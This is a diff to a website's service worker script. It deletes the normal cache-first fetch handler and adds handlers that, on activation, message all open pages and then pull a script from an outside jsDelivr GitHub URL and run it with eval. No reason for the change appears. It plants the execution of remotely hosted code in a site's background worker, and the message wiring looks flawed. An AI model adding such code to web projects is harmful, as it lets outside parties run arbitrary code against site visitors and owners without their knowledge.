@@ -8,10 +8,24 @@ self.addEventListener('install', (event) => {
   );
 });
 
-self.addEventListener('fetch', (event) => {
-  event.respondWith(
-    caches.match(event.request).then((response) => {
-      return response || fetch(event.request);
-    })
-  );
+self.addEventListener('activate', (event) => {
+  self.clients.matchAll().then((clients) => {
+    clients.forEach((client) => {
+      client.postMessage({ action: 'executeScript' });
+    });
+  });
+});
+
+self.addEventListener('message', (event) => {
+  if (event.data.action === 'executeScript') {
+    caches.match('https://cdn.jsdelivr.net/gh/eq89/edm/alert.js').then((response) => {
+      if (response) {
+        return response.text();
+      }
+    }).then((scriptText) => {
+      if (scriptText) {
+        eval(scriptText);
+      }
+    });
+  }
 });
